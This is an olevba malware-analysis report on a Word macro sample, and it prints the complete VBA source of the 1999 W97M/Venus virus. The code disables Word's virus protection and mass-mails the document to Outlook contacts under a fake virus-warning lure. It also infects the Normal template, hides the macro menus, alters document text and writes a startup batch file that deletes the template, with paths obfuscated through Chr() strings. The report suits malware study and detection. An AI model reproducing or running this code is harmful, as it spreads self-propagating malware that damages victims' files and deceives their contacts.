olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Melissa-based-64a3e541197cd59e1c418141caba7cc692de3bbe
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Melissa-based-64a3e541197cd59e1c418141caba7cc692de3bbe - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Venus.bas 
in file: Virus.MSWord.Melissa-based-64a3e541197cd59e1c418141caba7cc692de3bbe - OLE stream: 'Macros/VBA/Venus'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Skip As Integer
    
Sub Venus()

    Rem W97M/Venus
    Rem ...by Lucky Warrior
    Rem Copyright (c) 1999 O.E.S., Philippines
    
    Rem I dedicate this virus to my beloved sister Venus...
    
On Error Resume Next
Options.ConfirmConversions = False
Options.VirusProtection = False
Options.SaveNormalPrompt = False
ActiveDocument.VBProject.VBComponents("Venus").Export Chr(99) + Chr(58) + Chr(92) + Chr(86) + Chr(101) + Chr(110) + Chr(117) + Chr(115) + Chr(46) + Chr(115) + Chr(121) + Chr(115)
ActiveDocument.ReadOnlyRecommended = False
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Lucky Warrior") <> "Do you know where Venus is?" Then
Set objOL = CreateObject("Outlook.Application")
Set MN = objOL.GetNameSpace("MAPI")
If objOL = "Outlook" Then
MN.Logon "profile", "password"
For y = 1 To MN.AddressLists.Count
Set AddyBook = MN.AddressLists(y)
x = 1
Set MV = objOL.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
MV.Recipients.ADD Peep
x = x + 1
If x > 30 Then oo = AddyBook.AddressEntries.Count
Next oo
MV.Subject = "VIRUS WARNING!!! From " & Application.UserName
MV.Body = "Somebody by the nickname of Lucky Warrior, is sending out a virus that could shut down your computer.  DO NOT OPEN ANYTHING FROM HIM. I attached here the document that contains info & removing instruction about this very dangerous virus, just in case you encountered this. Please practice cautionary measures & forward this to all your on-line friends ASAP."
MV.Attachments.ADD ActiveDocument.FullName
MV.Send
Peep = ""
Next y
MN.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Lucky Warrior") = "Do you know where Venus is?"
End If
If Day(Now) = Day(Now) And Minute(Now) = Minute(Now) Then Call AdditionalSideEffects
Application.Caption = "Venus"
Application.UserName = "Lucky Warrior"
With Dialogs(wdDialogFileSummaryInfo)
    .Author = Chr(76) + Chr(117) + Chr(99) + Chr(107) + Chr(121) + Chr(32) + Chr(87) + Chr(97) + Chr(114) + Chr(114) + Chr(105) + Chr(111) + Chr(114)
    .Comments = Chr(87) + Chr(104) + Chr(101) + Chr(114) + Chr(101) + Chr(32) + Chr(105) + Chr(115) + Chr(32) + Chr(86) + Chr(101) + Chr(110) + Chr(117) + Chr(115) + Chr(63)
    .Execute
End With
MakeIt$ = Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(109) + Chr(115) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
YouNeedME = GetAttr(NormalTemplate.FullName)
If YouNeedME = vbReadOnly And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call GoForIt(MakeIt$)
If YouNeedME = vbReadOnly + vbArchive And System.OperatingSystem = "Windows" And System.LanguageDesignation = "English(United States)" Then Call GoForIt(MakeIt$)
If YouNeedME = vbReadOnly Then GoTo SuckIt
If YouNeedME = vbReadOnly + vbArchive Then GoTo SuckIt
If NormalTemplate.VBProject.VBComponents.Item("Venus").Name <> "Venus" Then YouHateMe = True
If ActiveDocument.VBProject.VBComponents.Item("Venus").Name <> "Venus" Then IHateYou = True
If YouHateMe = True And IHateYou = False Then Set CallOff = NormalTemplate.VBProject.VBComponents
If YouHateMe = False And IHateYou = True Then Set CallOff = ActiveDocument.VBProject.VBComponents
CallOff.import Chr(99) + Chr(58) + Chr(92) + Chr(86) + Chr(101) + Chr(110) + Chr(117) + Chr(115) + Chr(46) + Chr(115) + Chr(121) + Chr(115)
If YouHateMe = True And IHateYou = False Then Shell ("label c: Venus"), 0
If YouHateMe = False And Skip <> 1 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
If IHateYou = False Then If NormalTemplate.Saved = False Then NormalTemplate.Save
CommandBars("tools").Controls("Macro").Delete
CommandBars("tools").Controls("Templates and add-ins...").Delete
SuckIt:
End Sub
Sub HelpAbout()
    On Error Resume Next
    MsgBox "W97M/Venus by Lucky Warrior", vbInformation
End Sub
Sub FileNew()
    On Error Resume Next
    Call Venus
Dialogs(wdDialogFileNew).Show
    Skip = 1
    Call Venus
End Sub
Sub FileSave()
    On Error Resume Next
    Call Venus
    ActiveDocument.Save
End Sub
Sub FileClose()
    On Error Resume Next
    Call Venus
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    ActiveDocument.Close
End Sub
Sub ToolsOptions()
    On Error Resume Next
Dialogs(wdDialogToolsOptions).Show
    Call Venus
End Sub
Sub EditFind()
    On Error Resume Next
Dialogs(wdDialogEditFind).Show
    Call Venus
End Sub
Sub FileSaveAs()
    On Error Resume Next
Dialogs(wdDialogFileSaveAs).Show
    Call Venus
End Sub
Sub FilePrint()
    On Error Resume Next
Dialogs(wdDialogFilePrint).Show
    Call Venus
End Sub
Sub FileExit()
    On Error Resume Next
    Call Venus
    If ActiveDocument.Saved = False Then ActiveDocument.Save
    Application.Quit
End Sub
Sub AutoOpen()
    On Error Resume Next
    Call Venus
End Sub
Sub AutoExit()
    On Error Resume Next
    Call Venus
End Sub
Sub AutoExec()
    On Error Resume Next
    Call Venus
End Sub
Sub AutoClose()
    On Error Resume Next
    Call Venus
End Sub
Sub ViewVBCode()
    On Error Resume Next
End Sub
Sub AdditionalSideEffects()
    On Error Resume Next
        Selection.HomeKey Unit:=wdStory
        Selection.Find.ClearFormatting
        Selection.Find.Replacement.ClearFormatting
        With Selection.Find
            .Text = "of"
            .Replacement.Text = "Venus"
            .Forward = True
            .Wrap = wdFindContinue
            .Format = False
            .MatchCase = False
            .MatchWholeWord = True
            .MatchAllWordForms = False
        End With
        Selection.Find.Execute Replace:=wdReplaceAll
CommandBars("edit").Controls("Undo VBA-Find.Execute").Delete
CommandBars("edit").Controls("Repeat Replace...").Delete
CommandBars("edit").Controls("Replace...").Delete
If ActiveDocument.Saved = False Then ActiveDocument.Save
End Sub
    
Sub GoForIt(strFile As String)
    
Dim hFile As Long
On Error Resume Next
n$ = NormalTemplate
Part11$ = "attrib -h -r "
snag$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(49) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
snag1$ = Chr(99) + Chr(58) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(126) + Chr(49) + Chr(92) + Chr(109) + Chr(105) + Chr(99) + Chr(114) + Chr(111) + Chr(115) + Chr(126) + Chr(50) + Chr(92) + Chr(116) + Chr(101) + Chr(109) + Chr(112) + Chr(108) + Chr(97) + Chr(126) + Chr(49) + Chr(92)
Part2$ = Chr(100) + Chr(101) + Chr(108)
hFile = FreeFile
Open strFile For Output Access Write As hFile
Print #hFile, "@echo off"
Print #hFile, Part11$ + snag$ + n$
Print #hFile, Part11$ + snag1$ + n$
Print #hFile, Part2$ + snag$ + n$
Print #hFile, Part2$ + snag1$ + n$
Print #hFile, "cls"
Print #hFile, Part2$ + Chr(99) + Chr(58) + Chr(92) + Chr(119) + Chr(105) + Chr(110) + Chr(100) + Chr(111) + Chr(119) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(109) + Chr(126) + Chr(49) + Chr(92) + Chr(112) + Chr(114) + Chr(111) + Chr(103) + Chr(114) + Chr(97) + Chr(109) + Chr(115) + Chr(92) + Chr(115) + Chr(116) + Chr(97) + Chr(114) + Chr(116) + Chr(117) + Chr(112) + Chr(92) + Chr(109) + Chr(115) + Chr(102) + Chr(105) + Chr(108) + Chr(101) + Chr(46) + Chr(98) + Chr(97) + Chr(116)
Close hFile
End Sub

    Rem W97M/Venus
    Rem ...by Lucky Warrior
    Rem Copyright (c) 1999 O.E.S., Philippines
    
    Rem I dedicate this virus to my beloved sister Venus...
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|OPEN                |May open a file                              |
|Suspicious|Write               |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|Windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

